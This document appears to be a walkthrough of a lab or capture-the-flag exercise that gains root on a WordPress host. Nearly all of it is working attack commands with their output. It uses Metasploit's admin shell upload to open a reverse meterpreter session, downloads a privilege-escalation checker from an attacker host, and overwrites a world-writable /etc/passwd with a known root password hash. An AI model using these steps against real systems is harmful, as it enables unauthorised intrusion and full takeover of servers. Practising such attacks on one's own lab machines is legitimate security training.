# exploit msf-wp-upc-passwd-rce-root

1. `$ msfconsole`

2. `msf6 > use exploit/unix/webapp/wp_admin_shell_upload`

```
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
```

3. `msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 172.21.208.156`
4. `msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /secret/`
5. `msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin`
6. `msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD admin`
7. `msf6 exploit(unix/webapp/wp_admin_shell_upload) > options`

```
Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.21.208.156   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                         ki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /secret/         yes       The base path to the wordpress application
   USERNAME   admin            yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.21.215.12    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
...
View the full module info with the info, or info -d command.
```

8. `msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit`

```
[*] Started reverse TCP handler on 172.21.215.12:4444 
[*] Authenticating with WordPress using admin:admin...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /secret/wp-content/plugins/ISiJNzMFSF/VjGRDGizmZ.php...
[*] Sending stage (39927 bytes) to 172.21.208.156
[+] Deleted VjGRDGizmZ.php
[+] Deleted ISiJNzMFSF.php
[+] Deleted ../ISiJNzMFSF
[*] Meterpreter session 1 opened (172.21.215.12:4444 -> 172.21.208.156:59970) at ...

meterpreter >
```

9. `meterpreter > getuid`

```
Server username: www-data
```

10. `meterpreter > shell`

```
Process 13623 created.
Channel 0 created.
sh: 0: getcwd() failed: No such file or directory
sh: 0: getcwd() failed: No such file or directory
```

11. _(meterpreter > shell)_ `whoami`

```
www-data
```

12. _(meterpreter > shell)_ `python -c "import pty; pty.spawn('/bin/bash')"`

```
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@vtcsec:$
```

13. _(meterpreter > shell)_ `www-data@vtcsec:$ cd ../../../tmp`

14. _(temporary terminal)_ `$ sudo service apache2 start`

15. _(temporary terminal)_ `$ sudo cp /usr/bin/unix-privesc-check /var/www/html/unix-privesc-check`

16. _(meterpreter > shell)_ `www-data@vtcsec:../../../tmp$ wget http://172.17.243.250/unix-privesc-check`

```
wget http://172.17.243.250/unix-privesc-check
...
Connecting to 172.17.243.250:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 36801 (36K)
Saving to: 'unix-privesc-check'

unix-privesc-check  100%[===================>]  ...    

... - 'unix-privesc-check' saved [36801/36801]
```

17. _(meterpreter > shell)_ `www-data@vtcsec:../../../tmp$ chmod +x unix-privesc-check`

18. _(meterpreter > shell)_ `www-data@vtcsec:../../../tmp$ ./unix-privesc-check standard > output.txt`
```
./unix-privesc-check standard > output.txt
passwd: Permission denied.
./unix-privesc-check: 1076: [: standard: unexpected operator
...
./unix-privesc-check: 1076: [: standard: unexpected operator
```

19. _(meterpreter > shell)_ `www-data@vtcsec:../../../tmp$ cat output.txt`

```
cat output.txt
Assuming the OS is: linux
Starting unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )

This script checks file permissions and other settings that could allow
local users to escalate privileges.

Use of this script is only permitted on systems which you have been granted
legal permission to perform a security assessment of.  Apart from this 
condition the GPL v2 applies.

Search the output below for the word 'WARNING'.  If you don't see it then
this script didn't find any problems.

...

############################################
Checking for writable config files
############################################
    Checking if anyone except root can change /etc/passwd
WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
    Checking if anyone except root can change /etc/group
    Checking if anyone except root can change /etc/fstab
    Checking if anyone except root can change /etc/profile
    Checking if anyone except root can change /etc/sudoers
    Checking if anyone except root can change /etc/shadow

...
```

20. _(meterpreter > shell)_ `exit` (x2)

21. `meterpreter > download /etc/passwd ~`

```
[*] Downloading: /etc/passwd -> /home/kali/passwd
[*] Downloaded 2.31 KiB of 2.31 KiB (100.0%): /etc/passwd -> /home/kali/passwd
[*] download   : /etc/passwd -> /home/kali/passwd
```

22. _(temporary terminal)_ `$ openssl passwd -1 test`    

```
$1$C8Zk.39L$4eclb8y86GedE2U15RmiG1
```

23. _(temporary terminal)_ `vim ~/passwd`

- old 
```
root:x:0:0:root:/root:/bin/bash
...
```

- new
```
root:$1$C8Zk.39L$4eclb8y86GedE2U15RmiG1:0:0:root:/root:/bin/bash
...
```

24. `meterpreter > upload ~/passwd /etc/passwd`

```
[*] uploading  : /home/kali/passwd -> /etc/passwd
[*] Uploaded -1.00 B of 2.34 KiB (-0.04%): /home/kali/passwd -> /etc/passwd
[*] uploaded   : /home/kali/passwd -> /etc/passwd
```

25. `meterpreter > shell`

```
Process 30926 created.
Channel 4 created.
sh: 0: getcwd() failed: No such file or directory
sh: 0: getcwd() failed: No such file or directory
```

26. _(meterpreter > shell)_ `python -c "import pty; pty.spawn('/bin/bash')"`

```
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@vtcsec:$
```

27. _(meterpreter > shell)_ `www-data@vtcsec:$ su root -l`

```
Password: test
```

28. _(meterpreter > shell)_ `root@vtcsec:~# whoami`

```
root
```
